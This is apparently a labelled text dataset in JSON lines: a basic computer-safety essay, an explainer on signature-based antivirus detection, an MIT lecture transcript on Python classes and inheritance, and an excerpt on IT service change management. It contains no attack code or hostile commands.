{"text": "With the development of science and technology, computer has become more and more popular in our daily life, which is intended to be a part of our life. But at the same time it also brings the safety problem, because increasing number of bad people would like to break into computer systems to steal the secret information. It seems that computer safety has been a serious problem by now. Maybe you could learn something about the safety terms in Microsoft so that you could adopt the different methods according to different cases.\nWhat is malware? In fact malware, short for “malicious software”, is any kind of software which is installed without your complete permission and is not in need at all.The famous malware areviruses, worms, and Trojan horses, which are almost known to us all. Even though you are not familiar with them, you must have heard of it at ordinary times. If you want to protect your computer from the malware, you could make sure that the automatic updating is turned on all the time to get the latest updates.\n2 antispyware software\nAntispyware software helps protect your computer, and prevent the pop-ups, slow performance, and security threats caused by spyware and other adverse software. Every computer user must keep antispyware software up to date in order to keep in touch with the latest spyware. Aimed at protecting our computer, we could use Microsoft Security Essentials, free download software, to be against spyware and other malicious software.\nA firewall is used to help screen out hackers, viruses, and worms that try to attack your computer through the Internet.In fact, if you are the one who use the computer at home, the most efficient and important step is to enable firewall when you start your computer. A virus will slip through and infect you; the only effective way by protecting yourself is using a firewall. A firewall monitors your Internet connections and allows you to specify which programs are allowed to connect and which are not.\n4 antivirus software\nAntivirus software is a kind of computer program which can be used to test, defend, and take actions to remove or delete malicious software program. As we all know, computer virus is some programs, which can specially disturb computer operation. So we should update antivirus software in regular time to prevent against the latest virus.\n5 Windows password\nBesides the above mentioned software, you could have an alternative at the same time, namely Windows password. With a password like this, you can prevent your privacy from being let out or being viewed. Of course you should set up a Windows password reset disk to set the password reset in case that you forget it.\nAs a computer user, you should have a general knowledge of these safety terms so that you can protect your computer better. And with these terms, your computer can be protected better than that without them. In a word, please have a brief understanding of them in the first place, and then you could know how important they are.", "label": 1}
{"text": "Just as there are many variants and forms of electronic malware and Internet-based threats around the globe, so there are many forms of protection against these threats. Signature-based detection is one of the multifarious forms of defense that have been developed in order to keep us safe from malicious content.\nAlthough signature-based detection can be argued to have been overshadowed by more sophisticated methods of protection in some environments, it remains as a core ‘technique’ featuring in the anti-virus controls of packages and suites that work to protect a user’s system today.\nHow does signature-based detection work?\nSignature-based detection works by scanning the contents of computer files and cross-referencing their contents with the “code signatures” belonging to known viruses. A library of known code signatures is updated and refreshed constantly by the anti-virus software vendor.\nIf a viral signature is detected, the software acts to protect the user’s system from damage. Suspected files are typically quarantined and/or encrypted in order to render them inoperable and useless.\nClearly there will always be new and emerging viruses with their own unique code signatures. So once again, the anti-virus software vendor works constantly to assess and assimilate new signature-based detection data as it becomes available, often in real time so that updates can be pushed out to users immediately and zero-day vulnerabilities can be avoided.\nNext-generation signature-based detection\nNew variants of computer virus are of course developed every day and security companies now work to also protect users from malware that attempts to disguise itself from traditional signature-based detection. Virus authors have tried to avoid their malicious code being detected by writing “oligomorphic“, “polymorphic” and more recently “metamorphic” viruses with signatures that are either disguised or changed from those that might be held in a signature directory.\nDespite these developments, the Internet at large does of course still function on a daily basis. Populated as it is by users who not only have up to date security software installed, but also by those who have educated themselves as to the type of risks discussed here.", "label": 1}
{"text": "Topics covered: Encapsulation, inheritance, shadowing\nInstructor: Prof. Eric Grimson, Prof. John Guttag\nOPERATOR: The following content is provided under a Creative Commons license. Your support will help MIT OpenCourseWare continue to offer high quality educational resources for free. To make a donation or view additional materials from hundreds of MIT courses, visit MIT OpenCourseWare at ocw.mit.edu.\nPROFESSOR: Last lecture we were talking about classes, and object-oriented programming, and we're going to come back to it today. I'm going to remind you, we were talking about it because we suggested it is a really powerful way of structuring systems, and that's really why we want to use it, It's a very common way of structuring systems. So today I'm going to pick up on a bunch of more nuanced, or more complex if you like, ways of leveraging the power of classes. But we're going to see a bunch of examples that are going to give us a sense. I'm going to talk about inheritance, we're going to talk about shadowing, we're going to talk about iterators. But before get to it, I want to start by just highlighting, sort of, what was the point of classes? So I'll remind you.\nA class, I said, was basically a template for an abstract data type. And this was really to drive home this idea of modularity. I want the ability to say, I've got a set of things that naturally belong together, I'm going to cluster them together, I want to treat it like it's a primitive, I want to treat it like it's a float or an int or a string. Is this going to be a point or a segment or something different like that. So it's really a way, as I said, of just trying to cluster data together. And this is a notion of modularity slash abstraction where I'm treating them as primitives. But the second thing we talked about is that we also have a set of methods, using the special name method because we're talking classes. But basically functions that are designed to deal with this data structure. We're trying to group those together as well. So we cluster data and methods.\nSecond key thing we said was, in the ideal case, which unfortunately Python isn't, but we'll come back to that, in the ideal case, we would have data hiding, and by data hiding, which is sort of a version of encapsulation, what we meant was that you could only get to the internal pieces of that data structure through a proscribed method. Proscribed meaning it's something I set up. So data hiding saying, you would only access the parts through a method. And as we said, unfortunately Python does not enforce this. Meaning that I could create one of these data structures, ideally I'd have a method, that I'm going to see some examples of that I used to get the parts out, unfortunately in Python you could take the name the instance dot some internal variable you'll get it back. It is exposed. And this is actually just not a good idea. So I suggested in my very bad humor, that you practice computational hygiene and you only use appropriate methods to get the parts out. OK didn't laugh the joke last time, you're not going to laugh at it this time, I don't blame you. All right, and then the last piece of this is that we said the class is a template. When we call that class, it makes an instance. So class is used to make instances, meaning particular versions, of that structure, and we said inside the instances we have a set of attributes. Internal variables, methods, that are going to belong to that structure.\nOK, so with that in mind, here's what I want to do. I'm going to show you a set of examples, and I want to warn you ahead of time, the code handout today is a little longer than normal because we want to build essentially an extended example of a sequence of examples of classes. We're going to see the idea, of which we're gonna talk about, of inheritance or hierarchy, in which we can have classes that are specializations of other classes. We're gonna see how we can inherit methods, how we can shadow methods, how we can use methods in a variety of ways. So this is a way of suggesting you may find it more convenient to put notes on the code handout rather than in your own notes. Do whatever you like, but I just wanted to alert you, we're going to go through a little more code than normal.\nSo, the little environment I'm going to build is an environment of people. I'll build a simple little simulation of people. So I'm going to start off with the first class, which I've got up on the screen, and it's on your handout as well, which is I'm going to build an instance, or a class rather, of persons. I'm going to draw a diagram, which I'm gonna try and see if I can do well, over here, of the different objects we're going to have. So I've got, a class, and by the way a class is an object. Instances are also objects, but classes are objects. We're gonna see why we want that in a second. Because I'm gonna build an object, sorry a class, called a person. Now, let's walk through some of the pieces here. The first one is, there's something a little different. Remember last time we had that keyword class and then a name, that name, in this case, person says this is the name for the class, and then we would have just had the semicolon and a bunch of internal things. Here I've got something in parens, and I want to stress this is not a variable. All right, this is not a def, this is a class. I'm going to come back to it, but what this is basically saying is that the person class is going to inherit from another class, which in this case is just the built-in Python object class. Hold on to that thought, it's going to make more sense when we look at a little more interesting example, but I want to highlight that. All right now, if we do this, as I said before, we can create a version of a person, let me just call it per, person.\nOK? And what we said last time is, when we wanted to create an instance inside of this class definition, we've got one of those built-in things called init. I'm gonna again remind you, some of the methods we have, Underbar underbar init is going to be the thing that creates the instance. Actually slightly misspeaking, actually Python creates the instance, but it's one thing that fills it in. So in this case, I'm going to give it 2 arguments: Frank Foobar Now, you might have said, wait a minute, init here has 3 arguments: self, family name, and first name. So again, just to remind you, what we said happens here is that when I call this class, person, I'm creating an instance. We'll draw a little instance diagram down here. I'm going to give it the name per. And I should have said inside of person, we've got a set of things. We've got our underbar underbar init, we've got, what else do I have up there? Family name. And a bunch of other methods, down to say.\nWhat happens inside of Python is, when we called the class definition, person, it creates an instance, there it is. Think of it as a pointer to a spot in memory, and then what we do is, we call, or find, that init method, up here, and we apply it. And the first argument self, points to the instance. So this object here is what self looks at. Now you can see what init's going to do. It says, oh, inside of self, which is pointing to here, let me bind a variable, which was, can read that very carefully, it's family underbar name, to the value I passed in, which was 4. Same thing with first name. OK, so the reason I'm stressing this is, self we do not supply explicitly, it is supplied as pointing to the instance, it's giving us that piece of memory. And that is what then gets created. So here's, now, the instance for per. OK, and I put a little label on there, I'm going to call that an isALink, because it is an instance of that class. God bless you.\nAll right, so once we got this, let's look at what we can do with person. That's why I built person here. And as I said, I've already bound basically, those two pieces. If I want to get a value out, I can give person, or per, rather, this instance, a messaging. In this case I want to get family, what did I say, family name out, now, again I want to stress, what is happening here? per is an instance, it's this thing here. When I say per dot family name, I'm sending it a message, in essence what that does is, it says, from here it's going to go up the chain to this class object and find the appropriate method, which was family name. It is then going to apply that to self, which points to this instance. And that allows it, therefore, is you can see on the code, to look up under self, what's the binding for family name, and print it back up. So self is always going to point to the instance I want and I can use it. OK what else do we have in here? We can get the first name, that's not particularly interesting.\nWe've got 2 other special methods: that's cmp and str. All right, cmp is our comparison method. And since I, I was about to say I blew it last time, I misspoke last time, a wonderful phrase that politicians like to use, I misspoke last time. Let me clarify again what cmp will do. Underbar underbar cmp is going to be the method you're going to use to compare two instances of an object. Now, let's back up for second. If I wanted to test equality, in fact I could use underbar underbar eq, under under. It's natural to think about an equality tester as returning a Boolean, it's either gonna be true or false, because something's either equal to or not. In many languages, comparisons also return Booleans, which is why I went down this slippery slope. For many languages, either it's greater than or it's not. But Python is different. Python use cmp, in fact it has a built in cmp, which is what we're relying on here. Where am I, right there. And what cmp returns is 1 of 3 values. Given 2 objects, it says if the first one is less than the second one, it returns -1, if it's equal it returns 0, if it's greater than, it returns 1.\nSo it allows you this broader range of comparisons. And if you think about it, cmp, you could apply on integers, you could apply it on floats, apply it on strings. So it's overloaded, it has the ability to do all of those. And in this case what we're saying is, given 2 objects, let's create a tuple of the first, sorry, family and first name of ourselves, and other is another object, family and first name of that, and then just use cmp to compare them. All right, so it's going to use the base pieces. OK, so it gives me a way of doing comparisons. And str we saw last time as well, this is cmp does comparison, and str is our printed representation.\nOK. So what we've got now, is a simple little class. We've also got two methods there. I want to look at them, we're gonna come back to them, but they start to highlight things we can do with our classes. So I've built one simple version of it here, which is per. And notice I've got another method, right up here, called say. And say takes two arguments, for the moment the second argument, or the first argument's, not going to make a lot of sense, but say takes two arguments besides itself. It's going to take another object to which it's saying something and the thing to say. Since I only have one object here, I'm going to have person talk to himself. You may have met a few other undergraduates who have this behavior. I'll have him talk to himself and say, just some random message the faculty members occasionally worry about. OK, what does this thing do? Now you're going to see some of the power of this. Again, remember, I'm down here, I'm sending this the message say, it's going to go up the chain to find the say message in person. And what does say do, it says given another object and some string, it's going to return, oh, and interesting things, part of which you can't see on the screen. First what it does, is it gets first name of self. Remember self is pointing to this instance, so it's simply looks up that binding, which is Frank. It's going to create a string in which it adds to that the family name of self, and then another thing that says to, and then ah, I'm now going to send a message to the other object, saying give me your first name. Going to add that to the second piece, and you can see in this case it happens to be the same first and family name. And then at the end of it, which you can't see here but you can see in your handout, I just append the whole string, so it spits it out.\nWhat's the point of this, other than I can get it to say things? Notice, I can now reference values of the instance. But I can also get values of other instances, by sending in a message. And that's why we have that form right there. And then it glued all together. If you think about this for a second, you might say, wait a minute, actually you might have said wait a minute a while ago, why am I just using the variable name there in the function over here? Well in fact, I could've used the function here, first name open close, right? It would have done the same thing. But because I know I'm inside the instance, it's perfectly reasonable to just look up the value. OK, I could have, although I don't want you to do it, have done the same thing there and used underbar, sorry, first name underbar, sorry, first underbar name, but that's really breaking this contract that I want to happen. I should send the message to get the method back out. So again the standard practices is if you know you're inside the object, you can just access the values. If you're doing it with any other objects, send it a message to get it out.\nOK, now, that gives you an ability to say, let's look at one more example here, and then we're going to start building our hierarchy, which is, that this person can also sing. And we've got a little sing method here. And notice what it does, it's going to sing to somebody, I guess you're part of the Chorallaries. You're going to sing something, and notice what it does, it's simply going to use its say method, but add at the end of whatever's being said, just tra la la at the end. So this is now an example of a method using another method. Why would you want that? It's nice modularly. I have one method that's doing saying, I have another method that's just building on it. So if I have is person sing to themselves, not a highly recommended activity, it would help if I had it sing to itself, not sing to sing, sorry about that. Notice what it does. Looks like exactly like a say method, except it's got tra la la at the end. Don't worry I'm not going to sing to you. I'll simply say the words. Power of this, other than the silly examples. You see how I can access variables of the instance, how I can access variables of other instances, going to come back to that, and how I can use versions of my own methods to implement other methods. In this case sing is using say as part of what it wants to get out.\nOK, so we got a simple little example. Now, let's start adding some other pieces to this. OK, and what do I want to add. Find my spot here. OK, we're going to add an MIT person. Sorry, machine is -- do this, let's go down. OK so I'm going to add an MIT person. Look at the code for second. Aha! Notice what this says. MIT person says it inherits from person. That is, that's the first thing in parens up there. It says, you know, class of MIT person is person. What that is saying is, that this is a specialization of the person class. Or another way of saying it is, we have a super class, in this case it's person. And we have a subclass, in this case its MIT person. And we're going to walk through some examples, but what it says is that that subclass of MIT person can inherit the attributes of the person class. Can inherit the methods, it can inherit variables.\nOK, what does MIT person do? Well, here's 1 of the new things it does. It has a local variable called next id num, which is initially set to 0. See that up there. And then it's got some methods, it's got an init method, a get id method, a few other things. OK, let's run this. In particular, I go back down to this one. Let me just uncomment this and do it here. Assuming my machine will do what I want it to do, which it really doesn't seem to want to do today. Try one more time. Thank you, yep. Still not doing it for me, John. OK, we type it. No idea what Python doesn't like me today, but it doesn't. So we're gonna define p 1, I've lost my keyboard, indeed I have. Try one more time. p 1 MIT person, see how fast I can type here -- OK, now, let's look at what the code does, because again it's going to highlight some things. I called MIT person, push this up slightly, it's going to create an instance down here, I called p 1. And when I would do that, I'm gonna initialize it. So I've got, right up here, an initializer, init for MIT person, takes in the family name and the first name. Notice what it does. Huh. It says, if I'm sitting here at MIT person, I'm going to go up and inherit from person its init function and call it. And what am I calling it on? I'm calling it on self, which is pointing to this object, so I've still got it, and then I'm then going to apply the base initialization. And that does exactly what you'd expect, which is just going to create a binding for family name down here. As well as some other things. So this is an example of inheritance. MIT person inherits the init method from person, can get access to by simply referring to it, and I refer to it right there. And it's take the person class, get its init and apply it to my instance plus those things. So I'm just using the same piece of code\nNotice the second thing it does. It says inside of self, I'm going to bind the local variable id name to the value of next id name in MIT person. Self is down here, id num, sorry, not id name. I'm going to bind that to the value that I find my going up to here, which is 0, and having done that, I simply increment that value. OK? So what has this done? It says I now have captured in the class, a local variable that I can keep track of. And when I use it, every time I generate an example, let me build another one. I make p 2 another MIT person. OK, I can do things like saying, what is the id number for each of these. First one is 0, second one is 1, which makes sense, right? I'm just incrementing a global variable. Now, things I want you to see about this. Now that I've got a beginning of a hierarchy, I have this notion of inheritance. I can ask a function inside one class to use a function from a class that it can reach by going up the chain. I just did it there. I can ask it to go get values of variables, right, so that looks good. What else do we have in person or MIT person? Well, we can get the id number, we just did. We have a thing to do with this string. Notice it's going to print out something a little different. In fact, there's a kind of funky form there. Which just says, if I want to print it out, I'm gonna create, what this says to do is, I'm gonna create an output template that has that structure to it, but where I see that percent s I'm going to substitute this value for the first one, that value for the second. So if I say, what is p 1? It says ok, MIT person Fred Smith. On the other hand, if I said, what is per, which is that thing I build earlier, it had a different string method, which is just print out person, those pieces.\nAll right, one last piece to this and we're going to add to it. Suppose I want Fred to say something. Say something to Jane. OK, he said it. Where's the say method? OK, Fred is an instance of an MIT person. where's the say method? Well, there isn't one there, but again, that's where the hierarchy comes in. Fred is this object here, I'm sending it the message say. That turns into going up the chain to this object, which is the class object, and saying find a say method and apply it to that instance. Fudge-knuckle, it ain't here. Don't worry about it, because it says if I can't find one there, I'm going to go up the chain to this method, sorry to this class, and look for a method there. Which there was one, I have a say method. It's going to use that say method. Apply to it. Well, you might say, OK, what happens if it isn't there? Well, that's where, remember I defined person to be an instance of an object, it will go up the chain one last time to the base object in Python to see is there a method there or not. Probably isn't a say method for an object, so at that point it's going to raise an exception or throw an error. But now you again see this idea that the inheritance lets you capture methods.\nNow you might say, why not just put a say method inside of MIT person? Well, if you wanted it to do something different, that would be the right thing to do. But the whole notion here's that I'm capturing modularity, I've got base methods up in my base class. If I just want to use them I'm just going to inherit them by following that chain, if you like, basically up the track. OK, so we've got an MIT person, we can use that. Let's add a little bit more to our hierarchy here. I'm going to create, if I can do this right, a specialization of an MIT person, which is an undergraduate. A special kind of MIT person. All right, so if I go back up here, even though my thing is not going to let me do it, let's build an undergraduate. OK, there's the class definition for an undergrad. We're just starting to see some of the pieces, right, so in an undergraduate, where am I here, an undergraduate. OK, it's also got an initialization function. So if I call undergrad, I'm gonna make an undergrad here, again let me go back down here, line ug 2 it's making undergrad, Jane Doe. Now, what happens when I do the initialization here? Notice what goes on. It simply calls the person initialization method. All right, so I'm down here. I'm going to call the person initialization method, what did do? Sorry, the MIT person method, it calls the person method. Just walking up the chain, that's going to do exactly what I did with all the other ones, so I now have a family name and a first name. So I can, for example, say family name and get it back out. All right?\nAnd then, other things that I can do, well I can set what year the person's in, I can figure out what year they're in, there's this unfortunate overflow error if you've hung around too long, but that's not going to happen to you. And I've now got a say method here, so let's look what happens if I ask the undergraduate to say something. OK, it's not a realistic dialogue I know, but, what did this method do? I asked this object to do a say. And notice what it does. It simply passes it back up to MIT person. There's that inheritance again. It's saying, I'm going to have my base say method say something. I'm going to say it to a person, but all I'm going to do because undergraduates in my experience, at least, are always very polite, I'm going to put \"Excuse me but\" at the front of it. OK, what am I trying to show you here? I know the jokes are awful, but what am I trying to show you here? That I can simply pass up the chain to get it. In fact, what method does the final say here? What class does it come from? Person class, yes, thank you. It goes all the way up to person, right, because MIT person didn't have a say. So I can simply walk up the chain until I find the method I want to have.\nNow this is an example of shadowing. Not a great example, but it's a beginning example of shadowing, in that this same method for an undergraduate, shadows the base say method, it happens to call it, but it changes it. It puts \"Excuse me but\" at the front, before it goes on to do something. Now again, I could have decided here to actually copy what the original say method did, stitch all the other things together. But again, that loses my modularity. I'd really to only have to change it in one place. So by putting my say method up in person, I can add these nuances to it, and it lets me have something that has that variation. If I decide I want to change what say does, I only have to change it in one place. It is in the person class definition, and everything else will follow through for free.\nOK, so now I've got an undergrad, right? Let's look at a couple of variations of what happens here. So first of all, I can -- yes?\nPROFESSOR 2: Shadowing here is often sometimes called overriding.\nPROFESSOR: Yes, thank you, because I'm going to do a pure example of shadowing in a second, John right. Also called overriding. Part of the reason I like the phrase shadow is, if you think about it as looking at it from this direction, you see this version of init before you see the other ones, or you see that version of say, but it is overriding the base say example. OK, so I can say, what does p 1, sorry, yes, what does undergrad look like? And I said wait a minute, MIT person, not undergrad, is that right? Well, where's the str method? I didn't define one in undergrad, so it again tracks up the chain and finds the str method here, so it's OK undergrads are MIT people most the time, so it's perfectly fine.\nOK, now, I have built into this also these cmp methods. So I've got two examples. I've got undergrad, or ug. And then I've got poor old Frank Foobar back there, per person. So suppose I want to compare them? What do you think happens here? Compare sounds weird, right, I compare an undergraduate to a person. I don't know what that's doing, some kind of weird psychological thing, but what do you think happens in terms of the code here if I run this. I know it's a little hard because you got a lot of code to look at. Do I have a cmp method defined somewhere? Yeah. So, it's hard to know what it's going to do, but let's look at it. Hmm. Now sometimes I type things and I got errors I don't expect, this one I did expect. So what happened here? Well let's talk about what happens if I do that comparison I was doing, what was I doing? Ug greater than per? What unwinds into is, I'm going to send to ug, that instance, a cmp method. This is really going to become something like ug dot under under cmp under under applied to per. I think that's close.\nWhat does that do? It says starting in ug, I'm going to look for the first cmp method I could find, which is actually sitting here. I had a cmp method in MIT person. If you look at your code, what does it do? It looks up the id numbers to compare them. Well the, ug has an id number because it was created along this chamber. Remember per over here was just created as a person. It doesn't have an id number, so that's why it complaints. Ok, happens if I do that? Compare per to ug. How many people think I get an error? Wow. How many people think I'm going to get either true or false out of this? A few brave hands. Why? Can I ask you, please? Why do you think I'm going to get a, doesn't matter whether it's true or false, why am I going to have something work this time that didn't work last time?\nPROFESSOR: Yeah, exactly. And in case you didn't hear it, thank you, great answer, sorry, terrible throw. In this case I'm using per, that's the first part, so it's not symmetric. It's gonna use per to do the look up. And as it was said there, per over here goes up and finds a cmp method here which it can apply. In that case, it simply looked at, remember, it took the tuples of first and last name which are both defined here, and did some comparison on that. So this is a way of again pointing out to you that the things are not always symmetric, and I have to be careful about where do I find the methods as I want to use them.\nOk? All right. Let's add, I'm gonna do two more classes here. Let's add one more class, some people debate whether these are really people or not, but we're going to add a class called a professor. OK. Now what am I doing? I'm creating another version of class down here. Which again is an instance, or a subclass, sorry, not an instance, a subclass of an MIT person. I see that because I built it to be there. Again I've got an initialization that's going to call the person initialization, which we know is going to go up -- I keep saying that -- going to call the MIT person initialization, which is going to go up and call this one. So again I'm going to be able to find names. And I do a couple of other different things here. I'm gonna pass in a rank, full professor, associate professor, assistant professor, which I'm just going to bind locally. But I'm gonna add one other piece here, which is I'm gonna add a little dictionary on teaching. So when I create a professor, I'm gonna associate with it a dictionary that says, what have you been teaching?\nAnd then notice the methods I create. I've got a method here called add teaching, takes, obviously a pointer to the instance. A term, which will just be a string, and a subject. And let's look at what it does right here. OK. In fact the call I'm going to make, I'm not certain I'm going to be able to get away with it, my machine is still wonderfully broken, all right, it is, let me just show you what the calls would look like. As you can see here I'm not going to be able to do them. But I'm going to add teaching, as a method call with this with a string for term, and a subject number. What is this going to do? Yeah, I know I'm just worried if I restart Python, I may not be able to pull the thing back in, so I'm going to try and wing it, John, and see if I can make it happen.\nRight, what does that teaching do? It's got one of those try except methods. So what does it say it's going to do? It's going to go into the dictionary associated with teaching, under the value of term, and get out a list. And it's going to append to the end of the list the new subject. So it's going to be stored in there, is then going to be term, and a list of what I taught, in case I teach more than one thing each term. It's going to do that, but notice it's a try. If in fact there is no term currently in the dictionary, started out empty, it's going to throw an error, sorry, not throw an error, it's going to raise an exception. Which is a key error, in which case notice what I'm going to do, I'm not going to treat it as an error. I'm simply going to say, in that case, just start off with an empty, with an initial list with just that subject in and put it in the dictionary. As I add more things in, I'll just keep adding things to this dictionary under that term. And if I want to find out what I'm doing, well I can use get teaching, which says given the term, find the thing in the dictionary under that term and return it. If I get an error, I'm going to raise it, which says there is nothing for that term, and in that case I guess I'm just going to return none.\nOK? And then the other two pieces we're going to have here, and we want to look at a little more carefully, I just wanted to show you that example, is a professor can lecture, and a professor can say something. Look at the say method, because this now add one more nuance to what we want to do here. And I think in interest of making this go, let me actually, since I'm not going to get my machine to do this right, let me create a couple of professors. If I look at what that is, it's an MIT person because I didn't have any separate string thing there, and we will create a more important professor. What rank do you want, John? Do you want to stay full?\nPROFESSOR 2: Undergraduate.\nPROFESSOR: Undergraduate, right, a lot more fun I agree. Sorry about that, and we can again just see what that looks like. And that of course, we'll print out, he's also an MIT person. But now here's what I want to do. I want to say something to my good colleague Professor Guttag. Actually I'm going to start a separate -- I'm going to say something to a smart undergraduate. So if I say, remember we have ug defined as an undergraduate, let me do something a little different here. Well let, me do it that way. It says, I don't understand why you say you were enjoying 6.00. Not a good thing to say, right, but if I say to my good colleague Professor Guttag. I have to spell say right, I know, I need help with this, what can I say? We flatter each other all the time. It's part of what makes us feel good about ourselves. Why is the sky blue? I enjoyed your paper, but why is the sky blue?\nOK, terrible examples, but what's going on here? One more piece that I want to add. Here's my say method for professor, and now I'm actually taking advantage of to whom I am saying something. Notice again, what does it do? There's the self argument, that's just pointing to the instance of me. I'm passing in another argument, going to call it to who, in one case it was ug, in one case it was Guttag. And then the thing I want to say, ah, look what it does, it says, check the type. And the type is going to take that instance, I had an instance, for example, of a professor down here, and it's going to pick up what type of object it is. So if the type of the person I'm speaking to is undergrad, let's pause for second. Remember I started away back saying we're building abstract data types. Well, here's a great example of how I'm using exactly that, right? I've got int, I've got float, I now have ug, it's a type. So it's says if the object to whom I'm speaking is an undergrad, then use the same method from person where I'm going to put this on the front. On the other hand, if the object to whom I'm speaking is a professor, then I'm going to tag this on the front and use the underlying say method. On the other hand, if I'm speaking to somebody else, I'm just going to go lecture. All right, and when a professor lectures, they just put it's obvious on the end of things, as you may have noticed.\nWhat's the point I want you to see here? I'm now using the instances to help me to find what the code should do. I'm looking at the type. If the type is this, do that. If the type is this, do something different, ok? And I can now sort of build those pieces up. OK, I said one more class. Notice what we're doing. I know they're silly examples, but, sorry, they are cleverly designed examples to highlight key points. What I'm trying to do is show you how we have methods inherit methods, how have message shadow methods, how we have methods override methods, how we can use instances as types to define what the method should do.\nLet me show you one last class, because I'm gonna have one more piece that we want to use. And the last class is, sort of, once you've got a set of professors, you can have an aggregate of them. And I don't know, if a group of geese are gaggle, I don't know what a set of professors are, John. Flamers? I, you know, we've got to figure out what the right collective noun here is. We're going to call them a faculty for lack of a better term, right? Now the reason I want to show you this example is, this class, notice, it only is going to inherit from object. It actually makes sense. This is going to be a collection of things, but it's not a subclass of a particular kind of person. And what I want the faculty to do, is to be able to gather together a set of faculty. So if I go down here, grab this for second, and pull it down so you can see it. It looks like I'm not going to be able to run this because my machine is broken, but basically I'm gonna define a set of professors, and then I'm gonna create a new class called faculty. There's the definition of it. It's got an init. You can kind of see what it does. It's going to set up an internal variable called names, which is initially an empty list, internal variable called ids, which is empty, an internal variable called members, which is empty, and another special variable called place, which we're going to come back to in a second, initially bound to none.\nOK, I've got a method called add which I'm going to use down here to add professors to the course 6 faculty. Here's what I want to add to do. First of all, notice I'm going to check the type. If this is not a professor, I'm gonna raise an error, a type error, it's the wrong type of object to pass in. The second thing I'm gonna do is say, if that's okay, then let me go off and get the id number. Now remember, that's right up here, so I'm asking the instance of the professor to go up and get the id number. And I want to make sure I only have one instance of each professor in my faculty, so if the id number is in the list of ids already, I'm going to raise an error, sorry, raise an exception as well, saying I've got a duplicate id. OK? And the reason that's going to come up is, notice what I do now. Inside of the instant self, I take the variable names and I add to it the family name of the person I just added. OK, notice the form. I'm using the method, there's the parens to get the family name of the person. I'm just adding it to the list. I've got the id number, I've added the ids, and I add the object itself into members. So as I do this, what am I doing? I'm creating a list, actually several lists: a list of ids, a list of the actual instances, and a list of the family names. And as a cost I want to add, that's why I can check and see, is this in here already or not?\nNow, the last reason I want to do this is, I want to be able to support things like that. This is now different, right, this instance is a collection. I want to be able to do things like, for all the things in that collection, do something, like print out the family names. And to do that, I need two special forms: iter and next. OK, now let me see if I can say this cleanly. Whenever I use a for, in structure, even if it was on just a normal list you built, what Python is doing is returning an, what is called an iterator. Which is something that we talked earlier. It's keeping track of where are you in the list, and how do I get to the next thing in the list?\nI'm going to do the same thing here, and I'm going to create it for this particular structure. So this little thing iter, when I call a for something in, one of these instances, it calls iter, and notice what it does. It initializes place to 0. That was that variable I had up there. That's basically saying I'm at the beginning of the list. It's a pointer to the beginning of the list, and it returns self. Just gives me back a pointer to the instance. That now allows me at each step in that loop to call next. And what does next do? Next says, check to see if that value is too long, if it's longer than, for example, the list of names, raise an exception called stop iteration, which the for loop will use to say OK, I'm done. I'm going to break out of the for loop. Otherwise, what am I going to do? I'll increment place by 1, that's going to move me to the next place in the list, and then in this case I'll just return the instance itself, right? Members is a list of instances, place I've incremented by 1, I take 1 off of it, I get to it. So iter and next work together. Iter creates this method, that's going to give you a pointer to the place in the structure, and then next literally walks along the structure giving you the next element and returning elements in turn so you can do something with it.\nRight, so now what that says is, I can have classes that just have local variables. I can have classes that get methods from other variables, and I can also have classes that are collections. And I've supported that by adding in this last piece. OK once you have all of that, in principle we could start doing some fun things. So let's see what happens if we try and make all of this go. And let me, since I'm not going to be able to run it, let me simply do it this way. If I have my undergraduate, ug. I can -- sorry, let's not do it that way -- I can have undergraduate say things like -- all right, what did I just do wrong here? Do I not have undergrad defined? I do. Oh, I didn't have Grimson, sorry, it's me, isn't it? Thank you. The undergraduate very politely asks why he didn't understand, you can have the professor respond. Again, it simply puts a different thing into there. On the other hand, if Professor Guttag asks me something about understanding, I say I really like this paper on, you do not understand, it's a deep paper on programming languages 5, I think, John, isn't it? What else can you do with this thing, right? You can have an undergraduate talk to an undergraduate, in which case they're still polite. Or you could have -- sorry, let me do that the other way -- you could also have an undergraduate simply talk to a normal person. All right, but the good news is you know eventually you get it done, and when you're really done you can have the undergraduate be really happy about this, and so she sings to herself.\nOK it's a little silly, but notice what we've just illustrated. And this is where I want to pull it together. With a simple set of classes, and the following abilities, an ability to inherit methods from subclasses, sorry from superclasses, that is having this hierarchy of things. I can create a fairly complex kind of interaction. I can take advantage of the types of the objects to help me decide what to do. And if you think about that, I know it sounds very straightforward, but you would do exactly that if you were writing earlier code to deal with some numerical problem. All right, if the thing is an integer, do this, if it's a float, do that, if it's a string, do something else. I'm now giving you exactly the same ability, but the types now can be things that you could create. And what I've also got is now the ability to inherit those methods as they go up the chain. So another way of saying it is, things that you want to come away from here, are, in terms of these classes. We now have this idea of encapsulation. I'm gathering together data that naturally belongs as a unit, and I'm gathering together with it methods that apply to that unit. Just like we would have done with float or int. Ideally, we data hide, we don't happen to do it here, which is too bad.\nBasically we've got the idea of encapsulation. The second thing we've got is this idea of inheritance. Inheritance both meaning I can inherit attributes or field values. I can inherit methods by moving up the chain. I can also the shadow or override methods, so that I can specialise. And I do all of that with this nice hierarchy of classes. So what hopefully you've seen, between these two lectures, and we're going to come back to it in some subsequent lectures, is that this is now a different way of just structuring a computational system. Now, you'll also get arguments, polite arguments from faculty members or other experts about which is a better way of doing it. So I'll give you my bias, Professor Guttag will give you his bias next time around. My view, object-oriented system are great when you're trying to model systems that consist of a large number of units that interact in very specific ways. So, modeling a system of people's a great idea. Modeling a system of molecules is probably a great idea. Modeling a system where it is natural to associate things together and where the number of interactions between them is very controlled. These systems work really well. And we'll see some examples of that next week. Thanks.", "label": 1}
{"text": "The Operations Layer defines the operational processes and procedures necessary to deliver Information Technology (IT) as a Service. This layer leverages IT Service Management concepts that can be found in prevailing best practices such as ITIL and MOF. The main focus of the Operations Layer is to execute the business requirements defined at the Service Delivery Layer. Cloud-like service attributes cannot be achieved through technology alone and require a high level of IT Service Management maturity.\nChange Management process is responsible for controlling the life cycle of all changes. The primary objective of Change Management is to eliminate or at least minimize disruption while desired changes are made to services. Change Management focuses on understanding and balancing the cost and risk of making the change versus the benefit of the change to either the business or the service. Driving predictability and minimizing human involvement are the core principles for achieving a mature Service Management process and ensuring changes can be made without impacting the perception of continuous availability.\nStandard (Automated) Change\nNon-Standard (Mechanized) Change\nIt is important to note that a record of all changes must be maintained, including Standard Changes that have been automated. The automated process for Standard Changes should include the creation and population of the change record per standard policy in order to make sure auditability.\nAutomating changes also enables other key principles such as:\nThe Service Asset and Configuration Management process is responsible for maintaining information on the assets, components, and infrastructure needed to provide a service. Critical configuration data for each component, and its relationship to other components, must be accurately captured and maintained. This configuration data should include 